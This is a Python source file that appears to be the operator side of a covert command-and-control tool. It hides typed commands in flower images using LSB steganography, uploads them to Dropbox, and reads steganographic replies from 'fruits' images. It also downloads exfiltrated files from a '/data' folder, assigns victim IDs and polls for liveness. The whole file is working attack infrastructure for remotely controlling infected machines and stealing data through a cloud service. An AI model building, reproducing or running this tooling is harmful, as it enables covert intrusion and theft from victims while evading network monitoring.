import dropbox
import schedule
import time
import os
import threading
import sys
from stegano import lsb


# Dropbox Access Token and Initialization
ACCESS_TOKEN = '<insert_your_access_token>'
dbx = dropbox.Dropbox(ACCESS_TOKEN)

# File Paths
LOCAL_ID_FILE = 'ids.txt'
LOCAL_COMMAND_ID_FILE='commands_ids.txt'
DROPBOX_ID_FOLDER = '/ID'
DROPBOX_FRUITS_FOLDER = '/fruits'
DROPBOX_FLOWERS_FOLDER='/flowers'
DROPBOX_DATA_FOLDER='/data'


def get_next_command_id():
    if not os.path.exists(LOCAL_COMMAND_ID_FILE):
        return 1
    with open(LOCAL_COMMAND_ID_FILE, 'r') as file:
        last_id = int(file.read().strip())
        return last_id + 1

def update_command_id(next_id):
    with open(LOCAL_COMMAND_ID_FILE, 'w') as file:
        file.write(str(next_id))
def get_next_id():
    if not os.path.exists(LOCAL_ID_FILE):
        return 1
    with open(LOCAL_ID_FILE, 'r') as file:
        last_id = int(file.read().strip())
        return last_id + 1

def update_last_id(next_id):
    with open(LOCAL_ID_FILE, 'w') as file:
        file.write(str(next_id))

def upload_id_picture():
    next_id = get_next_id()
    try:
        response = dbx.files_list_folder(DROPBOX_ID_FOLDER)
        if len(response.entries) == 0:
            with open('Plumeria_clean.jpeg', 'rb') as f:
                dbx.files_upload(f.read(), f'{DROPBOX_ID_FOLDER}/id-{next_id}.jpg')
            update_last_id(next_id)
            print(f"Uploaded id-{next_id}.jpg")
    except Exception as e:
        print(f"Error: {e}")

def download_and_process_fruits():
    try:
        #print('Checking for fruits')
        response = dbx.files_list_folder(DROPBOX_FRUITS_FOLDER)
        for entry in response.entries:
            # Download
            local_path = entry.name
            dbx.files_download_to_file(local_path, f'{DROPBOX_FRUITS_FOLDER}/{entry.name}')
            # Process File Name
            parts = entry.name.split('-')
            message = reveal_secret(local_path)
            print(f"Sender ID: {parts[2]}, Command ID: {parts[3]}, Message: {message}")
            # Delete from Dropbox
            dbx.files_delete_v2(f'{DROPBOX_FRUITS_FOLDER}/{entry.name}')
            # Delete local file
            os.remove(local_path)
    except Exception as e:
        print(f"Error: {e}")


def upload_picture_with_command_id(command_id, message):
    secret = lsb.hide("./Plumeria_clean.jpeg", message)
    secret.save("./PlumeriaCommandera.png")
    picture_name = f'plumeria-commandera-{command_id}.png'
    try:
        with open('./PlumeriaCommandera.png', 'rb') as file:
            dbx.files_upload(file.read(), f'{DROPBOX_FLOWERS_FOLDER}/{picture_name}')
        print(f"Uploaded {picture_name} to Dropbox")
        # clean up
        os.remove("./PlumeriaCommandera.png")
        return picture_name
    except Exception as e:
        print(f"Error uploading picture: {e}")
        return None

def delete_picture_from_dropbox(picture_name):
    try:
        dbx.files_delete_v2(f'{DROPBOX_FLOWERS_FOLDER}/{picture_name}')
        print(f"Deleted {picture_name} from Dropbox")
    except Exception as e:
        print(f"Error deleting picture: {e}")


def reveal_secret(name):
    return lsb.reveal(name)

def handle_input():
    print("Enter command: ")
    while True:
        command_input = input()
        if command_input:
            command_id = get_next_command_id()
            update_command_id(command_id + 1)
            picture_name = upload_picture_with_command_id(command_id, command_input)
            if picture_name:
                threading.Timer(30, delete_picture_from_dropbox, args=[picture_name]).start()

def check_data():
    try:
        response = dbx.files_list_folder(DROPBOX_DATA_FOLDER)
        for entry in response.entries:
            # Download
            local_path =  'data/' + str(entry.name)
            dbx.files_download_to_file(local_path, f'{DROPBOX_DATA_FOLDER}/{entry.name}')
            # Process File Name
            print(f"File: {entry.name} received.")
            # Delete from Dropbox
            dbx.files_delete_v2(f'{DROPBOX_DATA_FOLDER}/{entry.name}')
    except Exception as e:
        print(f"Error: {e}")
def check_alive():
    print('Checking aliveness')
    command_id = get_next_command_id()
    update_command_id(command_id + 1)
    picture_name = upload_picture_with_command_id(command_id, 'alive')

def start_scheduled_tasks():
    schedule.every(5).seconds.do(upload_id_picture)
    schedule.every(5).seconds.do(download_and_process_fruits)
    schedule.every(5).seconds.do(check_data)
    schedule.every(30).seconds.do(check_alive)
    print('Starting tasks')
    while True:
        schedule.run_pending()
        time.sleep(5)

if __name__ == "__main__":
    input_thread = threading.Thread(target=handle_input)
    input_thread.daemon = True
    input_thread.start()
    start_scheduled_tasks()

